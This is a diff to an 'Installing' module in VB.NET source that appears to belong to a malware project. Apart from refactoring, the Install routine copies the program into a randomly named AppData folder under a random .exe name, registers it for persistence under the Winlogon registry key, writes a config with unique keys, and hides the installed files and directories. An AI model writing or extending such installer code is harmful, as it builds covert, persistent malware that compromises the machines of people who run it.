@@ -5,18 +5,18 @@ Imports Newtonsoft.Json
 
 Module Installing
     Public Sub Install()
-        If Not File.Exists(GetPathes.Get_JsonFilewithPath()) Then
+        If Not File.Exists(Get_JsonFilewithPath()) Then
             Console.WriteLine("Installing")
             Dim installPath As String = GetAppdata() & "\" & RandomString(5, 8)
             Dim Re_Named_Main_file As String = RandomString(4, 8) & ".exe"
-            IOModule.CreateDirectory(installPath)
+            CreateDirectory(installPath)
             System.IO.File.Copy(GetMainFile(), installPath & "\" & Re_Named_Main_file)
             Dim ExeptFiles As New ArrayList From {
-                Re_Named_Main_file
+                GetMainFile()
             }
             Copy_filesExept(installPath, ExeptFiles)
             Copy_directories(installPath)
-            StartupRegistryModule.Set_registry("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", installPath & "\" & GetMainFile())
+            Set_registry("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", installPath & "\" & GetMainFile())
             Dim config As New ConfigModel With {
                 .KeyUnique = RandomString(10, 10),
                 .KeyCertified = SavedKeyCertified,
@@ -24,9 +24,9 @@ Module Installing
                 .MainPath = installPath
             }
             Dim jsonString As String = JsonConvert.SerializeObject(config)
-            IOModule.Write_file(Get_JsonFilewithPath(), jsonString)
-            HidderModule.Hide_files(installPath)
-            HidderModule.Hide_directories(installPath)
+            Write_file(Get_JsonFilewithPath(), jsonString)
+            Hide_files(installPath)
+            Hide_directories(installPath)
         End If
     End Sub
     Private Function RandomString(ByVal min As Integer, ByVal max As Integer) As String
